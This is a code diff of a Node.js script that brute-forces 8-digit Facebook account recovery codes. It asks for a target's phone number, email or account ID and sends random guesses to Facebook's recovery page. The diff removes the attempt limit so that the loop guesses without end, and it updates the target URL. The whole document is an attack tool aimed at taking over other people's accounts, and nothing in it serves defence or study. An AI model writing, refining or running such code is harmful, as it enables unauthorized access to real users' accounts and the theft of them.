@@ -1,20 +1,17 @@
 const readlineSync = require('readline-sync');
 
-const MAX_ATTEMPTS = 10000;
-
 function generateCode() {
     const digits = "0123456789";
     return Array.from({ length: 8 }, () => digits[Math.floor(Math.random() * digits.length)]).join('');
 }
 
 function bruteForceCode(targetInfo, targetUrl) {
-    for (let i = 0; i < MAX_ATTEMPTS; i++) {
+    while (true) {
         const code = generateCode();
         if (checkCodeValidity(targetInfo, code, targetUrl)) {
             return code;
         }
     }
-    throw new Error("No valid code found.");
 }
 
 function checkCodeValidity(targetInfo, code, targetUrl) {
@@ -33,7 +30,8 @@ function checkCodeValidity(targetInfo, code, targetUrl) {
 
 // Example usage:
 const targetInfo = readlineSync.question("Enter the target's phone number, email, or account ID: ");
-const targetUrl = "https://www.facebook.com/recover/initiate/";
+const targetUrl = "https://www.facebook.com/login/identify/?ctx=recover&from_login_screen=0";
+
 try {
     const validCode = bruteForceCode(targetInfo, targetUrl);
     console.log(`The valid 8-digit code on the specified page is: ${validCode}`);
